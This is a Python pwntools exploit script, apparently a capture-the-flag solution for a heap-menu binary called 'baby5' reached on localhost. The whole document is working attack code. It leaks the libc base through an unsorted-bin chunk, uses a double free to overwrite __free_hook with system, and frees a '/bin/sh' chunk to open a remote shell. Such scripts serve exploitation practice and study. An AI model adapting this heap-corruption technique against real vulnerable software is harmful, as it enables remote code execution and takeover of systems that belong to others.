from pwn import *
elf = ELF('baby5', checksec=False)
context.binary = elf

s = remote('localhost', 10000)
libc = ELF('libc.so.6', checksec=False)

def exit():
    s.sendlineafter('> ', '0')

count = -1
def add(size, data):
    global count
    count += 1
    s.sendlineafter('> ', '1')
    s.sendlineafter('size: ', str(size))
    s.sendlineafter('data: ', data)
    return count

def edit(index, size, data):
    s.sendlineafter('> ', '2')
    s.sendlineafter('item: ', str(index))
    s.sendlineafter('size: ', str(size))
    s.sendlineafter('data: ', data)

def delete(index):
    s.sendlineafter('> ', '3')
    s.sendlineafter('item: ', str(index))

def show(index):
    s.sendlineafter('> ', '4')
    s.sendlineafter('item: ', str(index))
    s.recvuntil('data: ')
    return s.recvline()[:-1]

A = add(0x420, 'hoge')  # unsorted bin
B = add(0x10, 'fuga')
C = add(0x10, '/bin/sh')
delete(A)

# libc leak
unsorted = unpack(show(0).ljust(8, b'\00'))
libc.address = unsorted - 0x60 - 0x3ebc40
print('libc_base:', hex(libc.address))

# double free
delete(B)
delete(B)

add(0x10, pack(libc.symbols.__free_hook))
add(0x10, 'fuga')
add(0x10, pack(libc.symbols.system))

delete(C)

s.interactive()
